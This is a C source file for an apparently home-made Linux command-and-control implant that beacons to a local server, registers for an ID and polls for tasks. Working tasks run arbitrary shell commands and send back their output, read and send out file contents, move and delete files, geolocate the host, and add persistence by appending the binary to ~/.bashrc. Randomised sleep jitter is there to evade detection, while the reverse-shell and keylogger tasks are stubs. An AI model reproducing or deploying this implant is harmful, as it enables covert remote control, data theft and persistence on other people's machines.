#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <errno.h>
#include "base64.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080
#define BUFFER_SIZE 32768

char uid[64];
double base_sleep_time = 5;
double sleep_time = 5; // jitter applied
double jitter = 0.0;

// function prototypes
void send_result(const char *id_task, const char *result_data, int is_error);

int connect_to_server() {
    int sockfd;
    struct sockaddr_in servaddr;
    
    // Création du socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // Configuration de l'adresse du serveur
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    
    // Connexion au serveur
    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
        perror("Erreur lors de la connexion au serveur");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

int send_command_and_get_response(const char *command, char *response, size_t response_size) {
    int sockfd = connect_to_server();
    if (sockfd < 0) {
        return -1;
    }
    
    // sending
    if (send(sockfd, command, strlen(command), 0) < 0) {
        perror("Erreur lors de l'envoi de la commande");
        close(sockfd);
        return -1;
    }
    
    // reception
    int bytes_received = recv(sockfd, response, response_size - 1, 0);
    if (bytes_received < 0) {
        perror("Erreur lors de la réception de la réponse");
        close(sockfd);
        return -1;
    }
    
    // adding null terminator
    response[bytes_received] = '\0';
    
    close(sockfd);
    return 0;
}

void get_uid() {
    char command[128] = "DECLARE,client,linux,terminal\n";
    char response[1024] = {0};
    
    if (send_command_and_get_response(command, response, sizeof(response)) < 0) {
        fprintf(stderr, "Erreur lors de la déclaration du client\n");
        return;
    }
    
    // expected format: "Ok, ad8895843b")
    strtok(response, ",");         // ignore the first field
    char *id = strtok(NULL, ",");
    
    // trimming whitespace and newlines to prevent issues
    if (id != NULL) {
        char *end = id + strlen(id) - 1;
        while (end > id && (*end == ' ' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }
    }
    
    strcpy(uid, id);
    
    printf("My UID: '%s'\n", uid);
}

void task_execve(char *command_str, char *argument_str, const char *id_task) {
    printf("Executing task execve\n");
    
    // decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // string concatenation
    char full_command[4096] = {0};
    strcpy(full_command, command);
    
    // append argument if it exists
    if (argument != NULL) {
        strcat(full_command, " ");
        strcat(full_command, argument);
    }
    
    printf("Executing command: %s\n", full_command);
    
    // execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    
    // reading the output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);
    
    // send the result back to server
    send_result(id_task, result_buffer, 0);
    
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    printf("Executing task sleep\n");
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            base_sleep_time = atof(decoded_sleep);
            sleep_time = base_sleep_time;
            printf("New sleep time: %.2f seconds\n", sleep_time);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter: %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
}

void calculate_random_sleep_time() {
    double time_1 = base_sleep_time - (jitter/100.0 * base_sleep_time);
    double time_2 = base_sleep_time + (jitter/100.0 * base_sleep_time);
    
    // seeding random number generator with urandom
    FILE *random_file = fopen("/dev/urandom", "r");
    unsigned int seed;
    fread(&seed, sizeof(seed), 1, random_file);
    srand(seed);
    fclose(random_file);
    
    double random_factor = (double)rand() / RAND_MAX;
    sleep_time = time_1 + random_factor * (time_2 - time_1);
    
    printf("Applied jitter: base=%.2fs, jitter=%.2f%%, sleep=%.2fs\n", 
           base_sleep_time, jitter, sleep_time);
}

// Fonction de callback pour libcurl
size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata) {
    strcat((char*)userdata, ptr);
    return size * nmemb;
}

void task_locate(const char *id_task) {
    printf("Executing task locate\n");
    
    char result_buffer[4096] = {0};
    
    // initialize curl
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Erreur d'initialisation de curl\n");
        send_result(id_task, "Error initializing curl", 1);
        return;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, "https://ipinfo.io");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
    
    // exec
    CURLcode res = curl_easy_perform(curl);
    
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        fprintf(stderr, "Erreur curl: %s\n", curl_easy_strerror(res));
        send_result(id_task, curl_easy_strerror(res), 1);
        return;
    }
    
    send_result(id_task, result_buffer, 0);
}

void task_revshell() {
    printf("Executing task revshell\n");
    return;
}

void task_keylog() {
    printf("Executing task keylog\n");
    return;
}

void task_persist(const char *id_task) {
    printf("Executing task persist\n");
    
    char result_buffer[BUFFER_SIZE] = {0};
    char exe_path[1024] = {0};
    
    // get current executable path
    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    
    char *home = getenv("HOME");
    if (home) {
        char bashrc_path[1024];
        snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);
        
        FILE *bashrc = fopen(bashrc_path, "a");
        if (bashrc) {
            fprintf(bashrc, "\nrestarting implant%s &>/dev/null &\n", exe_path);
            fclose(bashrc);
            snprintf(result_buffer, sizeof(result_buffer), "Persistence added to %s", bashrc_path);
            send_result(id_task, result_buffer, 0);
            return;
        }
    }
    
    send_result(id_task, "persistence failed", 1);
}

// general function to send results
void send_result(const char *id_task, const char *result_data, int is_error) {
    char *encoded_result = encode(result_data);
    
    char cmd[BUFFER_SIZE];
    char response[1024] = {0};
    
    snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
    printf("Sending %s data\n", is_error ? "error" : "result");
    
    if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
        fprintf(stderr, "Error sending result\n");
    } else {
        printf("Server response: %s\n", response);
    }
    
    free(encoded_result);
}

void task_cat(char *file_path_str, const char *id_task) {
    printf("Executing task cat\n");
    
    // decoding file path
    char *file_path = decode(file_path_str);
    if (!file_path) {
        send_result(id_task, "Error decoding file path", 1);
        return;
    }
    
    printf("Reading file: %s\n", file_path);
    
    // open and read file
    FILE *file = fopen(file_path, "r");
    char content[BUFFER_SIZE] = {0};
    fread(content, 1, BUFFER_SIZE-1, file);
    fclose(file);
    printf("File content: %s\n", content);
    
    // sending the result
    send_result(id_task, content, 0);
    
    free(file_path);
}

void task_mv(char *src_path_str, char *dst_path_str, const char *id_task) {
    printf("Executing task mv\n");
    
    // decode paths
    char *src_path = decode(src_path_str);
    char *dst_path = decode(dst_path_str);
    
    printf("Moving %s to %s\n", src_path, dst_path);
    
    // rename/move the file
    int result = rename(src_path, dst_path);
    
    free(src_path);
    free(dst_path);
}

void task_rm(char *file_path_str, const char *id_task) {
    printf("Executing task rm\n");
    
    // decode path
    char *file_path = decode(file_path_str);
    
    printf("Removing file: %s\n", file_path);
    
    // remove the file
    int result = unlink(file_path);
    
    free(file_path);
}

void task_ps() {
    printf("Executing task ps\n");
    return;
}

void task_netstat(const char *id_task) {
    printf("Executing task netstat\n");
    return;
}

void check_commands() {
    char cmd[128];
    char result[1024] = {0};
    
    // command format : "FETCH,uid"
    snprintf(cmd, sizeof(cmd), "FETCH,%s\n", uid);
    
    // sending with socket
    if (send_command_and_get_response(cmd, result, sizeof(result)) < 0) {
        fprintf(stderr, "Erreur lors de la récupération des commandes\n");
        return;
    }
    
    printf("Server response: %s\n", result);
    
    // checking if server returns an error
    if (strncmp(result, "ERROR", 5) == 0) {
        printf("Error received from the server: %s\n", result);
        return;
    }
    
    // expected format : "type,id_task,command,argument")
    char *type = strtok(result, ",");
    
    if (type != NULL) {
        char *id_task = strtok(NULL, ",");
        if (strcmp(type, "EXECVE") == 0) {
            char *command = strtok(NULL, ",");
            char *argument = strtok(NULL, ",");
            task_execve(command, argument, id_task);
        } else if (strcmp(type, "SLEEP") == 0) {
            char *sleep_time = strtok(NULL, ",");
            char *jitter = strtok(NULL, ",");
            task_sleep(sleep_time, jitter);
        } else if (strcmp(type, "LOCATE") == 0) {
            task_locate(id_task);
        } else if (strcmp(type, "REVSHELL") == 0) {
            task_revshell();
        } else if (strcmp(type, "KEYLOG") == 0) {
            task_keylog();
        } else if (strcmp(type, "PERSIST") == 0) {
            task_persist(id_task);
        } else if (strcmp(type, "CAT") == 0) {
            char *file_path = strtok(NULL, ",");
            task_cat(file_path, id_task);
        } else if (strcmp(type, "MV") == 0) {
            char *src_path = strtok(NULL, ",");
            char *dst_path = strtok(NULL, ",");
            task_mv(src_path, dst_path, id_task);
        } else if (strcmp(type, "RM") == 0) {
            char *file_path = strtok(NULL, ",");
            task_rm(file_path, id_task);
        } else if (strcmp(type, "PS") == 0) {
            task_ps();
        } else if (strcmp(type, "NETSTAT") == 0) {
            task_netstat(id_task);
        } else {
            printf("Unknown or unsupported type: %s\n", type);
        }
    } else {
        printf("Malformed or empty response.\n");
    }
}

int main() {
    build_decoding_table();
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // step 1 : get uid
    get_uid();
    
    while (1) {
        // step 2 : check tasks
        printf("\nChecking commands...\n");
        check_commands();
        
        // step 3 : sleep
        calculate_random_sleep_time();
        
        printf("Pause of %.2f seconds\n", sleep_time);
        sleep(sleep_time);
    }
    
    // cleaning
    curl_global_cleanup();
    base64_cleanup();
    return 0;
}